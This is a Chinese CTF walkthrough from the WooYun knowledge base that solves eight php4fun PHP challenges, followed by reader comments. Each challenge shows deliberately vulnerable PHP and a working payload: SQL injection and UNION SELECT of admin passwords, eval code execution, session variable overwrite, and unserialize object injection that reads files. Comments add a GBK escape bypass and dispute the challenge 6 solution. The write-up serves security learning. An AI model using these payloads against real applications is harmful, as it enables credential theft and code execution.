@@ -1,0 +1,256 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">php4fun.sinaapp.com PHP挑战通关攻略</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">八折</a> <span class="bull">·</span> <time title="2013/10/10 18:27" ui-time="" datetime="2013/10/10 18:27" class="published ng-binding ng-isolate-scope">2013/10/10 18:27</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>challenge 1</h2><hr><p>php code：</p><pre><code>#!php    
+#GOAL: get password from admin;
+error_reporting(0);
+require 'db.inc.php';
+
+function clean($str){
+    if(get_magic_quotes_gpc()){
+        $str=stripslashes($str);
+    }
+    return htmlentities($str, ENT_QUOTES);
+}
+
+$username = @clean((string)$_GET['username']);
+$password = @clean((string)$_GET['password']);
+
+$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
+$result=mysql_query($query);
+if(!$result || mysql_num_rows($result) &lt; 1){
+    die('Invalid password!');
+}
+
+$row = mysql_fetch_assoc($result);
+
+echo "Hello ".$row['name']."&lt;/br&gt;";
+echo "Your password is:".$row['pass']."&lt;/br&gt;";
+</code></pre><h3>攻略：</h3><p>在单引号内的mysql注入，核心就是逃脱单引号，要么生成一个(htmlentities了单引号，不太可能)，要么...干掉一个。</p><h3>所以：</h3><pre><code>http://php4fun.sinaapp.com/c1/index.php?username=admin\&amp;password=%20or%201%23
+</code></pre><h2>challenge 2</h2><hr><p>php code：</p><pre><code>#!php
+#GOAL: gather some phpinfo();
+
+$str=@(string)$_GET['str'];
+eval('$str="'.addslashes($str).'";');
+</code></pre><h3>攻略：</h3><p>eval('$str="'.addslashes($str).'";');这段最后成为php代码 $str="<strong><em>"，</em></strong>里双引号被addslashes，但内容在双引号内可以${${这里执行代码}}</p><h3>所以：</h3><pre><code>http://phpchallenges2.sinaapp.com/index.php?str=${${phpinfo()}}
+</code></pre><h2>challenge 3</h2><hr><p>php code:</p><pre><code>#!php
+# GOAL: dump the info for the secret id
+require 'db.inc.php';
+
+$id = @(float)$_GET['id'];
+
+$secretId = 1;
+if($id == $secretId){
+    echo 'Invalid id ('.$id.').';
+}
+else{
+    $query = 'SELECT * FROM users WHERE id = \''.$id.'\';';
+    $result = mysql_query($query);
+    $row = mysql_fetch_assoc($result);
+
+    echo "id: ".$row['id']."&lt;/br&gt;";
+    echo "name:".$row['name']."&lt;/br&gt;";
+}
+</code></pre><h3>攻略：</h3><p>主要是利用php和mysql对float数字型支持的精度不同，精度小的会忽略不能支持的位数。</p><h3>所以：</h3><pre><code>http://php4fun.sinaapp.com/c3/index.php?id=1.0000000000001
+</code></pre><h2>challenge 4</h2><hr><p>php code:</p><pre><code>#!php
+#GOAL:get password from admin
+# $yourInfo=array(
+#   'id'    =&gt; 1,
+#   'name'  =&gt; 'admin',
+#   'pass'  =&gt; 'xxx',
+#   'level' =&gt; 1
+# );
+require 'db.inc.php';
+
+$_CONFIG['extraSecure']=true;
+
+//if register globals = on, undo var overwrites
+foreach(array('_GET','_POST','_REQUEST','_COOKIE') as $method){
+     foreach($$method as $key=&gt;$value){
+          unset($$key);
+     }
+}
+
+$kw = isset($_GET['kw']) ? trim($_GET['kw']) : die('Please enter in a search keyword.');
+
+if($_CONFIG['extraSecure']){
+     $kw=preg_replace('#[^a-z0-9_-]#i','',$kw);
+}
+
+$query = 'SELECT * FROM messages WHERE message LIKE \'%'.$kw.'%\';';
+
+$result = mysql_query($query);
+$row = mysql_fetch_assoc($result);
+
+echo "id: ".$row['id']."&lt;/br&gt;";
+echo "message: ".$row['message']."&lt;/br&gt;";
+</code></pre><h3>攻略：</h3><p>这段$kw在单引号里，看起来只要能使用单引号就行，所以干掉_CONFIG['extraSecure']就ok，刚好前面画蛇添足的有可利用的变量unset(不然咋通关？)，然后就是联合查询了。</p><h3>所以：</h3><pre><code>http://php4fun.sinaapp.com/c4/index.php?kw='%20and%200%20union%20select%20name,pass%20from%20users%20where%20id=1%23&amp;_CONFIG=aaa
+</code></pre><h2>challenge 5</h2><hr><p>php code：</p><pre><code>#!php
+# GOAL: overwrite password for admin (id=1)
+#       Try to login as admin
+# $yourInfo=array( //this is your user data in the db
+#   'id'    =&gt; 8,
+#   'name'  =&gt; 'jimbo18714',
+#   'pass'  =&gt; 'MAYBECHANGED',
+#   'level' =&gt; 1
+# );
+require 'db.inc.php';
+
+function mres($str) {
+    return mysql_real_escape_string($str);
+}
+
+$userInfo = @unserialize($_GET['userInfo']);
+
+$query = 'SELECT * FROM users WHERE id = \''.mres($userInfo['id']).'\' AND pass = \''.mres($userInfo['pass']).'\';';
+
+$result = mysql_query($query);
+if(!$result || mysql_num_rows($result) &lt; 1){
+    die('Invalid password!');
+}
+
+$row = mysql_fetch_assoc($result);
+foreach($row as $key =&gt; $value){
+    $userInfo[$key] = $value;
+}
+
+$oldPass = @$_GET['oldPass'];
+$newPass = @$_GET['newPass'];
+if($oldPass == $userInfo['pass']){
+    $userInfo['pass'] = $newPass;
+    $query = 'UPDATE users SET pass = \''.mres($newPass).'\' WHERE id = \''.mres($userInfo['id']).'\';';
+    mysql_query($query);
+    echo 'Password Changed.';
+}
+else{
+    echo 'Invalid old password entered.';
+}
+</code></pre><h3>攻略：</h3><p>(1) http://www.80vul.com/webzine&#95;0x06/PSTZine&#95;0x06_0x03.txt (站上默认显示的密码就是个提示...估计是哪位大虾顺手改的) (2) $userInfo['pass'] = $newPass; //这句，改成1</p><h3>所以：</h3><p>(1) 修改jimbo18714密码为8 (2) 再次修改密码，提交时userInfo为8的序列化,newPass为1</p><h2>challenge 6</h2><hr><p>php code：</p><pre><code>#!php
+#GOAL: get the secret;
+
+class just4fun {
+    var $enter;
+    var $secret;
+}
+
+if (isset($_GET['pass'])) {
+    $pass = $_GET['pass'];
+
+    if(get_magic_quotes_gpc()){
+        $pass=stripslashes($pass);
+    }
+
+    $o = unserialize($pass);
+
+    if ($o) {
+        $o-&gt;secret = "?????????????????????????????";
+        if ($o-&gt;secret === $o-&gt;enter)
+            echo "Congratulation! Here is my secret: ".$o-&gt;secret;
+        else 
+            echo "Oh no... You can't fool me";
+    }
+    else echo "are you trolling?";
+}
+</code></pre><h2>攻略：</h2><p>serialize一个just4fun的对象，序列化之前先赋值给$o->enter (在本地执行是成功的，php4fun.sinaapp.com不行，代码改了？)</p><p>所以：</p><p>(1) 生成序列化的对象</p><pre><code>#!php
+class just4fun {
+    var $enter;
+    var $secret;
+}
+
+$a=new just4fun();
+$a-&gt;enter='?????????????????????????????';
+echo urlencode(serialize($a));
+</code></pre><p>(2)</p><pre><code>link?pass=O%3A8%3A%22just4fun%22%3A2%3A%7Bs%3A5%3A%22enter%22%3Bs%3A29%3A%22%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%22%3Bs%3A6%3A%22secret%22%3BN%3B%7D
+</code></pre><h2>challenge 7</h2><hr><p>php code:</p><pre><code>#!php
+# GOAL: get the key from $hidden_password[207]
+
+session_start();
+error_reporting(0);
+
+function auth($password, $hidden_password) {
+    $res = 0;
+    if(isset($password) &amp;&amp; $password != "") {
+        if($password == $hidden_password) {
+            $res = 1;
+        }
+    }
+    $_SESSION["logged"] = $res;
+    return $res;
+}
+
+function display($res){
+    $aff = htmlentities($res);
+    return $aff;
+}
+
+
+if(!isset($_SESSION["logged"]))
+    $_SESSION["logged"] = 0;
+
+$aff = "";
+include("config.inc.php");
+
+foreach($_REQUEST as $request) {
+    if(is_array($request)) {
+        die("Can not use Array in request!");
+    }
+}
+
+$password = $_POST["password"];
+
+if(!ini_get("register_globals")) {
+    $superglobals = array($_POST, $_GET);
+    if(isset($_SESSION)) {
+        array_unshift($superglobals, $_SESSION);
+    }
+    foreach($superglobals as $superglobal) {
+        extract($superglobal, 0);
+    }
+}
+
+if((isset($password) &amp;&amp; $password != "" &amp;&amp; auth($password, $hidden_password[207]) == 1) || (is_array($_SESSION) &amp;&amp; $_SESSION["logged"] == 1)) {
+    $aff = display("$hidden_password[207]");
+} else {
+    $aff = display("Try again");
+}
+echo $aff;
+</code></pre><h3>攻略：</h3><p>get the key from $hidden_password[207] 这句有点模糊，下面的‘所以’可以得到key（绕过REQUEST对数组的判断）</p><h3>所以：</h3><pre><code>http://php4fun.sinaapp.com/c7/index.php?_SESSION[logged]=1
+POST: _SESSION=1
+</code></pre><h2>challenge 8</h2><hr><p>php code：</p><pre><code>#!php
+#GOAL: file_get_content('sbztz.php')    : )
+
+    class just4fun {
+        public $filename;
+
+        function __toString() {
+            return @file_get_contents($this-&gt;filename);
+        }
+    }
+
+    $data = stripslashes($_GET['data']);
+    if (!$data) {
+        die("hello from y");
+    }
+
+    $token = $data[0];
+    $pass = true; 
+
+    switch ( $token ) {
+        case 'a' :
+        case 'O' :
+        case 'b' :
+        case 'i' :
+        case 'd' :
+            $pass = ! (bool) preg_match( "/^{$token}:[0-9]+:/s", $data );
+            break;
+
+        default:
+            $pass = false;
+
+    }
+
+    if (!$pass) {
+      die("TKS L.N.");
+    }
+
+    echo unserialize($data); 
+</code></pre><h3>攻略：</h3><p><a href="http://drops.wooyun.org/papers/596">http://drops.wooyun.org/papers/596</a></p><p><a href="http://zone.wooyun.org/content/6697">http://zone.wooyun.org/content/6697</a></p><h3>所以：</h3><p>(1) 生成利用的data:</p><pre><code>O%3A%2B8%3A"just4fun"%3A1%3A%7Bs%3A8%3A"filename"%3Bs%3A9%3A"sbztz.php"%3B%7D  (注意%2B)
+</code></pre><p>(2)</p><pre><code>http://php4fun.sinaapp.com/c8/index.php?data=O%3A%2B8%3A"just4fun"%3A1%3A%7Bs%3A8%3A"filename"%3Bs%3A9%3A"sbztz.php"%3B%7D
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/3939" rel="bookmark" id="re1">Mongodb注入攻击</a></li><li><a href="http://drops.wooyun.org/papers/1321" rel="bookmark" id="re2">wechall mysql关卡题解</a></li><li><a href="http://drops.wooyun.org/tips/7679" rel="bookmark" id="re3">php比较操作符的安全问题</a></li><li><a href="http://drops.wooyun.org/papers/850" rel="bookmark" id="re4">Attacking MongoDB</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">gethin</span> <span class="reply-time">2016-05-20 21:10:21</span></div><p></p><p>第六题看笑了。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">fk</span> <span class="reply-time">2016-04-03 14:22:21</span></div><p></p><p>@ambiguous 6啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ambiguous</span> <span class="reply-time">2016-04-01 17:36:56</span></div><p></p><p>第六题应该是这么解得<br>$a=new just4fun();<br>$a-&gt;enter=&quot;?????????????????????????????&quot;;<br>$a-&gt;secret=&amp;$a-&gt;enter;<br>print serialize($a);</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我</span> <span class="reply-time">2015-12-16 13:08:56</span></div><p></p><p>H呵呵呵</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">kill</span> <span class="reply-time">2014-10-26 14:06:52</span></div><p></p><p>审计大牛啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">J_R</span> <span class="reply-time">2014-05-22 10:12:37</span></div><p></p><p>challenge2跟addslashes($str)好像无关，就算没有addslashes(）也只能用${${phpinfo()}}才能执行成功</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-18 10:02:59</span></div><p></p><p>好牛逼啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-18 10:01:25</span></div><p></p><p>很赞啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">啊L川</span> <span class="reply-time">2013-11-25 15:05:17</span></div><p></p><p>看来这个 发现知识量严重不足</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Summer</span> <span class="reply-time">2013-11-14 11:12:12</span></div><p></p><p>大神·求方法~~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">猪头子</span> <span class="reply-time">2013-11-13 21:31:10</span></div><p></p><p>。。。第六题真不是这样解</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Summer</span> <span class="reply-time">2013-11-11 14:14:14</span></div><p></p><p>第六题····应该不是这样解把····感觉·····第六题的题解不对·</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">猪猪侠</span> <span class="reply-time">2013-10-21 16:54:25</span></div><p></p><p>其实很多大部分在80vul上找到对应的tips ：）不只是5</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2013-10-11 15:50:31</span></div><p></p><p>八折，在指点下，第五题已经更新搞定，哈哈哈……</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ray</span> <span class="reply-time">2013-10-11 15:03:12</span></div><p></p><p>nice job.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">冰雪风谷[NNU</span> <span class="reply-time">2013-10-11 13:08:12</span></div><p></p><p>challenge 5,<br>如果是gbk版本, 可以通过,%bf'来bypass mysql_real_escape_string, 然后通过union select 指定返回的结果,从而绕过限制.<br>不过,没试成功.<br>擦.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">laterain</span> <span class="reply-time">2013-10-11 12:47:31</span></div><p></p><p>第五题 是关于php字符串数组处理的一个小特性，当时我也是问了TPCS才知道怎么做的</p><p>80vul期刊：<br>http://www.80vul.com/webzine_0x06/PSTZine_0x06_0x03.txt<br>TPCS写的分析：<br>https://forum.90sec.org/thread-3482-1-1.html</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">八折</span> <span class="reply-time">2013-10-11 12:28:49</span></div><p></p><p>同学，你是php4fun的作者么？<br>第七题是要这个结果？<br>key: Did You Stand Too Close To The Fire<br>（如果是的话我修正一下）</p><p># GOAL: get the key from $hidden_password[207]<br>这句到底是要啥呐？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">齐迹</span> <span class="reply-time">2013-10-10 22:53:14</span></div><p></p><p>没注意看注释。。。跑偏了！洗洗睡明天搞！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">齐迹</span> <span class="reply-time">2013-10-10 22:46:06</span></div><p></p><p>第五题会不会考的xss呢？<br>ID和pass 在youyinfo里面已经有了 所以序列化一下就可以过验证。<br>然而mysql_real_escape_string 方法没有处理 所以newPass 可以写xss代码。第一步是有显示pass的。所以触发xss</p><p>不知道作者是不是这个意图！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">齐迹</span> <span class="reply-time">2013-10-10 22:14:46</span></div><p></p><p>长知识了！！明天研究一下第五题！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">猪头子</span> <span class="reply-time">2013-10-10 19:49:34</span></div><p></p><p>其实第七题是要求获得config.inc.php里的key而不是输入的111111....</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">疯狗</span> <span class="reply-time">2013-10-10 18:41:44</span></div><p></p><p>嗯，第五题亮了……</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2013-10-10 18:39:11</span></div><p></p><p>咦，怎么是布鲁史特的马甲吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2013-10-10 18:28:26</span></div><p></p><p>嗯，第五题亮了……</p><p></p></div></div></div></div></div></main>
